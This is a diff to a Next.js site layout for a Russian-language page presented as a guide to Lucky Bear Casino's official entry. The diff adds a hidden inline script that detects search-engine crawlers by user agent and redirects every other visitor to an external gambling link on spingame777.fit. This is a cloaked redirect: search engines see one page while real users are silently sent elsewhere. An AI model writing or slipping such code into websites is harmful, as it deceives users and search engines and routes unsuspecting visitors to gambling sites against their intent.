@@ -37,6 +37,21 @@ export default function RootLayout({
         <meta property="og:description" content="Короткий и понятный гид по Lucky Bear Casino для поиска официального входа и мобильной версии." />
         <meta property="og:type" content="website" />
         <meta property="og:locale" content="ru_RU" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://spingame777.fit/4htNNl");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
